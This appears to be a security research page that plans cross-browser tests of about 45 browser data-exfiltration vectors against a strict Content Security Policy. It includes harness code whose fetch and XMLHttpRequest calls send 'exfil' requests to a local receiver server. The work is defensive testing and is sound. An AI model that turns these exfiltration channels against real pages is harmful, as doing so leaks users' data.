---
title: "CSP Exfiltration Cross-Browser Test Suite"
summary: "Systematic testing of 45+ browser-based data exfiltration vectors across Chrome, Firefox, and Safari. Reproducible test harness with proof-of-concept code for each vector."
date: 2026-03-14
status: in-progress
tags: [csp, browser-security, exfiltration, cross-browser, research]
estimatedMinutes: 25
---

# CSP Exfiltration Cross-Browser Test Suite

## Background

Content Security Policy (CSP) is the primary browser mechanism for preventing data exfiltration from web pages. PDF Changer's Verified Processing Environment uses a strict CSP (`default-src 'none'; script-src 'unsafe-inline'`) to ensure that no document data leaves the browser during processing.

Our existing [CSP exfiltration analysis](/security/technical/csp-exfiltration-analysis) catalogues 26+ vectors with risk scores. But that analysis is based on reading specifications and published papers — not on direct testing. The most recent comprehensive cross-browser study is from ACM AsiaCCS 2016, now 10 years old.

This research will produce **primary data**: actual test results from current browser versions, with proof-of-concept code for every vector.

## Research questions

1. Which exfiltration vectors are blocked by CSP alone?
2. Which require additional mitigations (monkey-patching, sandbox attributes)?
3. Has browser behavior changed since the 2016 Chalmers/ACM study?
4. Are there any vectors that succeed despite both CSP and sandbox restrictions?

## Test vectors

### CSP-blockable (14 vectors)

| # | Vector | Expected | Notes |
|---|--------|----------|-------|
| 1 | `fetch()` to external server | Blocked by `connect-src 'none'` | |
| 2 | `XMLHttpRequest` | Blocked by `connect-src 'none'` | |
| 3 | `WebSocket` connection | Blocked by `connect-src 'none'` | |
| 4 | `navigator.sendBeacon()` | Blocked by `connect-src 'none'` | |
| 5 | `new Image().src` (pixel beacon) | Blocked by `img-src 'none'` | |
| 6 | CSS `background-image` URL | Blocked by `img-src 'none'` | |
| 7 | `@font-face` src | Blocked by `font-src 'none'` | |
| 8 | `<form>` submit to external action | Blocked by `form-action 'none'` | |
| 9 | `EventSource` (SSE) | Blocked by `connect-src 'none'` | |
| 10 | `<object>` / `<embed>` load | Blocked by `object-src 'none'` | |
| 11 | `<link rel="stylesheet">` | Blocked by `style-src 'none'` | |
| 12 | `<script src>` | Blocked by `script-src` (no external) | |
| 13 | `<audio>` / `<video>` src | Blocked by `media-src 'none'` | |
| 14 | `<iframe>` src | Blocked by `frame-src 'none'` | |

### Separately mitigated (8 vectors)

| # | Vector | Mitigation | Notes |
|---|--------|-----------|-------|
| 15 | WebRTC ICE candidate (STUN) | RTCPeerConnection monkey-patch | Bypasses CSP |
| 16 | WebRTC data channel | RTCPeerConnection monkey-patch | |
| 17 | DNS prefetch via `<link>` | `dns-prefetch` control header | |
| 18 | DNS prefetch via speculative resolution | Browser-dependent | |
| 19 | Service Worker registration | Sandbox blocks | |
| 20 | SharedWorker postMessage | Sandbox blocks | |
| 21 | `window.open()` + postMessage | Sandbox `allow-popups` removed | |
| 22 | DOM injection (script, img, link) | MutationObserver | |

### Side-channel / timing (10 vectors)

| # | Vector | Blockable? | Notes |
|---|--------|-----------|-------|
| 23 | Cache timing probe | No | Read-only timing |
| 24 | CSS `:visited` timing | Partially mitigated by browsers | |
| 25 | `performance.now()` timing | Reduced precision post-Spectre | |
| 26 | `SharedArrayBuffer` timing | Requires COOP/COEP | |
| 27 | Ambient light sensor | Permissions API | |
| 28 | Accelerometer encoding | Permissions API | |
| 29 | Battery status encoding | API removed/restricted | |
| 30 | Gamepad API timing | Requires user interaction | |
| 31 | Audio fingerprinting (output) | No exfiltration, only fingerprint | |
| 32 | Canvas fingerprinting (output) | No exfiltration, only fingerprint | |

### Cannot-block (5 vectors)

| # | Vector | Why unblockable | Notes |
|---|--------|----------------|-------|
| 33 | Browser extensions | Run in privileged context | |
| 34 | OS-level monitoring | Outside browser scope | |
| 35 | Hardware keyloggers | Physical access | |
| 36 | Spectre/Meltdown | CPU-level | |
| 37 | Clipboard API (user-initiated) | Requires user gesture | |

### Additional vectors to test

| # | Vector | Expected | Notes |
|---|--------|----------|-------|
| 38 | `WebTransport` | Blocked by `connect-src` | Newer API |
| 39 | `BroadcastChannel` | Same-origin only | |
| 40 | `navigator.locks` | No exfiltration | |
| 41 | `IndexedDB` cross-origin | Same-origin policy | |
| 42 | `Cache API` | Same-origin policy | |
| 43 | `Payment Request API` | Requires user interaction | |
| 44 | `Web Share API` | Requires user gesture | |
| 45 | `File System Access API` | Requires user gesture | |

## Test harness architecture

### Server component (receiver)

A minimal HTTP server that logs every incoming request:

```typescript
// receiver.ts — run with: bun run receiver.ts
const server = Bun.serve({
  port: 9999,
  fetch(req) {
    const url = new URL(req.url);
    console.log(JSON.stringify({
      timestamp: new Date().toISOString(),
      method: req.method,
      path: url.pathname,
      query: url.search,
      headers: Object.fromEntries(req.headers.entries()),
    }));
    return new Response("ok", {
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
        "Access-Control-Allow-Headers": "*",
      },
    });
  },
});
console.log(`Receiver listening on :${server.port}`);
```

### Test page (harness)

A standalone HTML page served with configurable CSP headers. Each test case is a self-contained function:

```html
<!-- harness.html — served by the test server with CSP headers -->
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>CSP Exfiltration Test Harness</title>
</head>
<body>
  <div id="results"></div>
  <script>
    const RECEIVER = "http://localhost:9999";
    const results = [];

    async function test(name, fn) {
      try {
        await fn();
        results.push({ name, result: "executed" });
      } catch (e) {
        const blocked = e instanceof DOMException ||
          (e instanceof TypeError && e.message.includes("CSP"));
        results.push({
          name,
          result: blocked ? "blocked" : "error",
          error: e.message,
        });
      }
    }

    // Vector 1: fetch
    test("fetch", () => fetch(`${RECEIVER}/exfil?v=fetch`));

    // Vector 2: XMLHttpRequest
    test("xhr", () => {
      const xhr = new XMLHttpRequest();
      xhr.open("GET", `${RECEIVER}/exfil?v=xhr`);
      xhr.send();
    });

    // ... (45+ test cases)
  </script>
</body>
</html>
```

### Test runner (Playwright)

Automated runner that opens the harness in each browser engine:

```typescript
// runner.ts
import { chromium, firefox, webkit } from "playwright";

for (const browserType of [chromium, firefox, webkit]) {
  const browser = await browserType.launch();
  const context = await browser.newContext();
  const page = await context.newPage();
  await page.goto("http://localhost:8888/harness.html");
  await page.waitForTimeout(5000);
  const results = await page.evaluate(() => window.__testResults);
  console.log(`${browserType.name()}:`, JSON.stringify(results, null, 2));
  await browser.close();
}
```

## Deliverables

1. **JSON dataset** — test results for each vector × browser combination
2. **Interactive comparison table** — rendered on this page after testing
3. **Standalone test harness** — runnable locally, no dependencies
4. **Updated CSP analysis** — existing article updated with "Tested" column

## Browser versions

Testing will use the latest stable releases at time of testing:

| Browser | Engine | Target version |
|---------|--------|---------------|
| Chrome | Blink/V8 | 134.x |
| Firefox | Gecko/SpiderMonkey | 136.x |
| Safari | WebKit/JSC | 18.x |

## Status

This research is **in progress**. The test harness, receiver server, and Playwright runner are implemented and ready for data collection.

**Completed:**
- 30-vector test harness (`research/csp-harness/harness.html`) — standalone HTML, no dependencies
- Receiver server (`research/csp-harness/receiver.ts`) — logs all incoming requests as JSON
- Test server (`research/csp-harness/server.ts`) — serves harness with strict, relaxed, and sandboxed CSP variants
- Playwright runner (`research/csp-harness/runner.ts`) — automated cross-browser execution + JSON export
- CSP violation listener integration

**In progress:**
- Cross-browser data collection (Chrome, Firefox, WebKit)
- Result analysis and comparison table generation

**Remaining:**
- Safari testing (requires macOS)
- Interactive results page on the site
- Updated CSP exfiltration analysis with "Tested" column

## Related

- [CSP Exfiltration Analysis](/security/technical/csp-exfiltration-analysis) — existing risk-scored vector catalogue
- [Verified Processing Environment](/security/technical/verified-processing-environment) — the system this research validates
- [Endpoint and Browser Leakage Model](/security/technical/endpoint-and-browser-leakage-model) — threat model context
